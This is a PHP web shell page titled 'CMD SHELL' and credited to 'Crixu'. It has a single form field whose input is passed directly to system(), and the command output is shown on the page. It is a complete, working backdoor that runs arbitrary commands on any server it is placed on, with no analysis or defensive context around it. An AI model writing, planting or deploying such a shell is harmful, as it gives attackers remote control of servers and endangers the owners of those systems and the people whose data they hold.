<pre>
<html><head>
<title>CMD SHELL</title>
<meta content="text/html; charset=utf-8">
<meta name="author" content="Crixu" />
<link rel="SHORTCUT ICON" href="http://us.yimg.com/i/mesg/emoticons7/61.gif">
<link href="http://fonts.googleapis.com/css?family=Iceland" rel="stylesheet" type="text/css">
<link rel="stylesheet" type="text/css" href="http://faisalahmed.me/wp-content/assets/css/1.css">
</head><body>
<pre>
<form method=post>
   Command <input name=cmd value=<?php $_POST['cmd'];?> >
</form>
<?php
if(isset($_POST['cmd']) && $_POST['cmd']!=''){
   system($_POST['cmd'].' 2>&1');
}
?>
</pre>
</body>
</html>